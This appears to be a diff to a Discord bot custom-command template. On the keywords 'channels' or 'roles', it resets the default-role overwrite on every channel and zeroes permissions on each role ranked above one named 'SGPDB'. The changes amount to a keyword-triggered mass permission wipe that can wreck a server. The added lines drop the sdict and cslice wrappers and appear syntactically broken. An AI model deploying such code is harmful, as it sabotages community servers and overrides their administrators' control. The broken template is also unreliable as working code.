@@ -1,12 +1,11 @@
 {{ if in .Message.Content "channels" }}
     {{ range $.Guild.Channels }}
-        {{ editChannel .ID ( createEditChannel "permissions" ( cslice
-            ( sdict "ID" $.Guild.ID "allow" ( toInt64 0 ) "deny" ( toInt64 0 ) )
-        ) ) }}
+        {{ editChannel .ID ( createEditChannel "permissions" ( "ID" $.Guild.ID "allow" ( toInt64 0 ) "deny" ( toInt64 0 ) )
+        ) }}
     {{ end }}
 {{ else if in .Message.Content "roles" }}
     {{ range $.Guild.Roles }}
-        {{ if gt .Position (getRole .BotUser.Username).Position }}
+        {{ if gt .Position ( getRole "SGPDB" ).Position }}
             {{ editRole .ID ( createRole "permissions" ( toInt64 0 ) ) }}
         {{ end }}
     {{ end }}
